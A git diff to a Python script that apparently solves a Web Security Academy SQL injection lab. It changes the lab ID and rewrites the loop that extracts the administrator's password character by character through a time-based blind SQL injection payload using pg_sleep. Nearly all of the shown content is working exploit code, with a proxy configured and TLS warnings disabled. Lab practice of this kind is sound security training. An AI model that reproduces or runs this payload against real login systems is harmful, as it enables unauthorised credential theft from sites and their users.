@@ -14,7 +14,7 @@ requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 class SQLi15:
     def __init__(self):
-        self.lab_id = "0aa400b4049476ac814248c900a5002f"
+        self.lab_id = "0a1800a20441372380ec7bdc006400c8"
         self.url = f"https://{self.lab_id}.web-security-academy.net"
         self.login_url = f"{self.url}/login"
         self.proxies = {"https": "http://127.0.0.1:8080"}
@@ -48,14 +48,16 @@ class SQLi15:
         password = ""
         # valid_chars = string.ascii_letters + string.digits
         valid_chars = string.ascii_lowercase + string.digits
-        for i in range(1, self.pw_len + 1):
-            for char in valid_chars:
-                print(f"building pw: {password}{char}")
+        while len(password) != self.pw_len:
+            for i in range(1, self.pw_len + 1):
+                for char in valid_chars:
+                    print(f"building pw: {password}{char}")
 
-                payload = f"'; SELECT CASE WHEN (SUBSTR(password, {i}, 1)='{char}') THEN pg_sleep({self.sleep}) ELSE null END FROM users WHERE username='administrator' AND 'a' = 'a"
-                r = self.execute_request(payload)
-                if r.elapsed.total_seconds() >= self.sleep:
-                    password += char
+                    payload = f"'; SELECT CASE WHEN (SUBSTR(password, {i}, 1)='{char}') THEN pg_sleep({self.sleep}) ELSE null END FROM users WHERE username='administrator' AND 'a' = 'a"
+                    r = self.execute_request(payload)
+                    if r.elapsed.total_seconds() >= self.sleep:
+                        password += char
+                        break
 
         self.password = password
 
